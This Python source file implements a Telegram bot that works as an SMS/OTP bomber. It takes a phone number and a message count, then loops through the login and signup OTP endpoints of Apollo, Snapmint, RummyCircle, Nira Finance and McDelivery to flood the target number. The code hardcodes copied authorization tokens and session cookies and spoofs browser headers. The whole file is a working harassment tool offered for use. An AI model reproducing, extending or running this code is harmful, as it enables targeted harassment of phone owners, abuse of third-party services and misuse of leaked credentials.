import requests
import telegram.ext
from time import sleep
from os import environ

token = environ['token']

class Mainscript:
    def __init__(self, number):
      self.number = number

    def apollo(self):
        headers = {
            'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
            'Connection': 'keep-alive',
            'DNT': '1',
            'Origin': 'https://www.apollopharmacy.in',
            'Referer': 'https://www.apollopharmacy.in/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
            'accept': '*/*',
            'authorization': 'Bearer 3d1833da7020e0602165529446587434',
              }

        json_data = {
            'operationName': 'Login',
            'variables': {
            'mobileNumber': f'+91{self.number}',
            'loginType': 'PATIENT',
              },
            'query': 'query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) {\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\n    status\n    message\n    loginId\n    __typename\n  }\n}\n',
                }

        response = requests.post('https://webapi.apollo247.com/', headers=headers, json=json_data)
        return response.status_code      

    def snapmint(self):
        headers = {
            'authority': 'api.snapmint.com',
            'accept': '*/*',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
            # Already added when you pass json=
            # 'content-type': 'application/json',
            'dnt': '1',
            'origin': 'https://snapmint.com',
            'referer': 'https://snapmint.com/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
        }

        json_data = {
            'mobile': self.number,
        }
        response = requests.post('https://api.snapmint.com/v1/public/sign_up', headers=headers, json=json_data)
        return response.status_code

    def rummyapi(self):
        cookies = {
            'sameSiteNoneSupported': 'true',
            'LONG_VISITOR': '2787e267-cbdf-4032-8f2d-9645fb1cfec1',
            'device.info.cookie': '{"bv":"104.0.0.0","bn":"Chrome","osv":"10","osn":"Windows","tbl":"false","vnd":"false","mdl":"false"}',
            'SSID': 'SSID4b721211-5179-48db-9ca2-8cedf600d5c8',
            'SSIDuser': 'SSID4b721211-5179-48db-9ca2-8cedf600d5c8%3A0',
            'ga24x7_pixeltracker': 'from_page%3Dindex.html%26referrer_url%3Dhttps%253A%252F%252Fwww.google.com%252F',
            '__utma': '3588915.1172103635.1660514286.1660514286.1660514286.1',
            '__utmc': '3588915',
            '__utmz': '3588915.1660514286.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
            '__utmt_pageTracker': '1',
            '__utmb': '3588915.1.10.1660514286',
            'NA_IDVISIT': '0d7937d9-8dd9-4bf5-95f5-20f4943a0537',
            'NA_VISITOR': '0d7937d9-8dd9-4bf5-95f5-20f4943a0537',
            'isLivechat': '0',
            'ga24x7_jsessionid': '"SSID4b721211-5179-48db-9ca2-8cedf600d5c8,, "',
            'hash_parameter': '0',
            'AWSALB': 'twWHmfYRDBfPLrq9WstPEtAY/+Wy45PMjFsBaLKs3gRPu8KJmMp70nDEQWdSEF04CAvl9Hv7eCD07PB9S9Ij9LG0ls/jMqOOu8C3TMtKMFa3Da5Coo1dqe2WWj7g',
            'AWSALBCORS': 'twWHmfYRDBfPLrq9WstPEtAY/+Wy45PMjFsBaLKs3gRPu8KJmMp70nDEQWdSEF04CAvl9Hv7eCD07PB9S9Ij9LG0ls/jMqOOu8C3TMtKMFa3Da5Coo1dqe2WWj7g',
            '_ga': 'GA1.2.1172103635.1660514286',
            '_gid': 'GA1.2.482317890.1660514290',
            '_gat_UA-3610156-1': '1',
        }

        headers = {
            'authority': 'www.rummycircle.com',
            'accept': '*/*',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
            'cache-control': 'max-age=0',
            'dnt': '1',
            'origin': 'https://www.rummycircle.com',
            'referer': 'https://www.rummycircle.com/',
            'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36',
        }

        json_data = {
            'mobile': self.number,
            'deviceId': 'ff2e30c7-0998-42c7-b2a7-4293c38bb040',
            'deviceName': '',
            'refCode': '',
            'isPlaycircle': False,
        }
        response = requests.post('https://www.rummycircle.com/api/fl/auth/v3/getOtp', cookies=cookies, headers=headers, json=json_data)
        return response.status_code



    def nira(self):
        headers = {
            'authority': '63ti5s0o80.execute-api.ap-south-1.amazonaws.com',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
            # Already added when you pass json=
            # 'content-type': 'application/json',
            'dnt': '1',
            'origin': 'https://apply.nirafinance.com',
            'referer': 'https://apply.nirafinance.com/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
        }

        json_data = {
            'mobileNumber': self.number,
            'otp': '',
        }
        response = requests.post('https://63ti5s0o80.execute-api.ap-south-1.amazonaws.com/Prod/nirawebloginapi', headers=headers, json=json_data)
        return response.status_code



    def macdonal(self):
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
            'AddressID': '0',
            'Authorization': 'Token 1e32549b6d6054059d8447d12be42612e31ac6f4af1155473ceb5e940d23649d',
            'BusinessModelID': '18',
            'CartID': '0',
            'Connection': 'keep-alive',
            # Already added when you pass json=
            # 'Content-Type': 'application/json',
            'CustomerID': '-1',
            'DNT': '1',
            'OrderTime': '0',
            'OrderType': 'R',
            'Origin': 'https://www.mcdelivery.co.in',
            'PlatForm': 'msite',
            'Referer': 'https://www.mcdelivery.co.in/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'Storeid': '1',
            'TokenTimestamp': '150820220314',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36',
            'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI5Njk0NDQiLCJhcCI6Ijc1NDEzMDQzNCIsImlkIjoiMDA2YjEwMDQwMzAyMDVlNSIsInRyIjoiMDBjZmQyMGQ1NzgxODJlYjU4MTBjNWMxMmI5NDZkNzAiLCJ0aSI6MTY2MDUxMzQ1MTk5NH19',
            'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'source': 'Web',
        }




        params = {
            'isLoggedIn': 'false',
            'businessModelID': '18',
            'storeID': '1',
        }

        json_data = {
            'MobileNo': self.number,
        }
        response = requests.post('https://services.mcdelivery.co.in/api/auth/sendotp', params=params, headers=headers, json=json_data)
        return response.status_code


def test_servers(num=8298408335):
    bomber = Mainscript(num)
    s = bomber.medbuzz()
    print(s, "medbuzz")
    input()
    s = bomber.apollo()
    print(s, "apollo")
    input()
    s = bomber.macdonal()
    print(s, "macdonald")
    input()
    s = bomber.nira()
    print(s, "nira")
    input()
    s = bomber.rummyapi()
    print(s, "rummyapi")
    input()
    s = bomber.snapmint()
    print(s, "snapmint")
    input()

  
def bomb__(pnumber, count, c=0):
    b = Mainscript(pnumber)
    while True:
        for func in [b.apollo, b.macdonal, b.nira, b.rummyapi, b.snapmint]:
            if c < count:
                func()
                c+=1
                sleep(2)
            else:
                return

def start(update, context):
    update.message.reply_text("Send a phone number with no. of messages to send!\nEx - 8298XXXXXX 10\nhere 10 is number of messages to send")

def bomb(update, cmd):
    update.message.reply_text(f"Sending {cmd[1]} messages to {cmd[0]}!") 
    bomb__(cmd[0], int(cmd[1]))
    update.message.reply_text(f"Sent {cmd[1]} messages!")
    
no_auth_limit = 50
def reply(update, context):
    cmd = update.message.text.split()
    try:
        if len(str(int(cmd[0]))) == 10:
            if int(cmd[1]) <= no_auth_limit or update.message.from_user['id'] == 1234046323:
                bomb(update, cmd)
            else:
                if 2 < len(cmd) and cmd[2] == "/auth":
                    bomb(update, cmd)
                else:
                    update.message.reply_text(f"you are NOT_AUTHORIZED to send messages above {no_auth_limit} at once!\nContact @adhirajranjan for AUTHORIZATION")
        else:
            update.message.reply_text("It's not a VALID phone number!")
    except Exception as e:
        print(e)
        update.message.reply_text("It's not a VALID command!")

updater = telegram.ext.Updater(token, use_context=True)
disp = updater.dispatcher

disp.add_handler(telegram.ext.CommandHandler("start", start))
disp.add_handler(telegram.ext.MessageHandler(telegram.ext.Filters.text, reply))

if __name__=="__main__":
    updater.start_polling()
    updater.idle()         
    
  
